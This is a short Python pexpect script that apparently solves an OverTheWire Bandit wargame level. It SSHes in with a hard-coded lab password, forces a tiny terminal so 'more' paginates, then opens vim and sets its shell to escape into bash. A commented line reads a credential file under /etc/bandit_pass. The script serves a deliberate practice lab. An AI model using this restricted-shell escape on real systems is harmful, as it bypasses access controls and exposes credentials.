# #!/bin/bash

#!/usr/bin/env python3
import time
import pexpect

host = "bandit.labs.overthewire.org"
port = 2220
user = "bandit26"
password = "s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ"

ssh_cmd = f"ssh -o StrictHostKeyChecking=no -p {port} {user}@{host}"
child = pexpect.spawn(ssh_cmd, encoding="utf-8")

# Force tiny terminal so 'more' always paginates
child.setwinsize(5, 20)

# Handle password
child.expect("password:")
child.sendline(password)

# Wait for 'more' screen
child.expect(["--More--", ":"])
child.send("v")   # go into vim

# Give vim time to start
time.sleep(1)

# Send vim commands to break out into bash
child.sendline(":set shell=/bin/bash")
child.sendline(":shell")

print("\n inside a real bash shell as bandit26 no way : \n")

child.sendline("c")

# child.sendline("cat /etc/bandit_pass/bandit26")
child.interact() # this gives me back control    # very crucial line if this don't work nothing works


# it worked no way !!!!!!!!!